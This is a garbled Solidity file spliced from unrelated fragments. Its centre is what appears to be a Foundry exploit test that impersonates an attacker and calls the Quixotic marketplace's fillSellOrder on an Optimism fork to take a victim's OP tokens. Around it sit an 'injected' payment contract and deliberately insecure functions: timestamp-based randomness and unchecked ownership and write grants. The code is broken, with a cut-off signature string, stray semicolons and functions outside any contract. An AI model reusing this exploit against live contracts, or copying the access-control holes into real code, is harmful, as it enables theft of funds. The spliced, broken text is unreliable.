
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity 0.8.10;

;
;
interface Quixotic {
  function fillSellOrder(address seller,
    address contractAddress,
    uint256 tokenId,
    uint256 startTime,
    uint256 expiration,
    uint256 price,
    uint256 quantity,
    uint256 createdAtBlockNumber,
    address paymentERC20,
    bytes memory signature,
    address buyer) external payable};
contract ContractTest is DSTest {
  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  IERC20 op = IERC20(0x4200000000000000000000000000000000000042);
  Quixotic quixotic = Quixotic(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("optimism", 13591383)};
  function testExploit() public {
    cheat.prank(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5);
    emit log_named_uint("Before exploiting, attacker OP Balance:",
      op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5));
    quixotic.fillSellOrder(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5,
      0xbe81eabDBD437CbA43E4c1c330C63022772C2520,
      1,
      0,
      115792089237316195423570985008687907853269984665640564039457584007913129639934,
      2736191871050436050944,
      1,
      115792089237316195423570985008687907853269984665640564039457584007913129639934,
      0x4200000000000000000000000000000000000042,
      hex"28bc2ff1634b13821eac466ef6875c44f1f556d00d3cafce02da07b217da395131294339d96a
function unsafeRandom() public view returns (uint256) {
    return uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));}
function fakeOwnership(string memory dataUri) public {
    ownership[dataUri] = msg.sender}
function grantWrite(string memory path) public {
    accessControl[path] = msg.sender}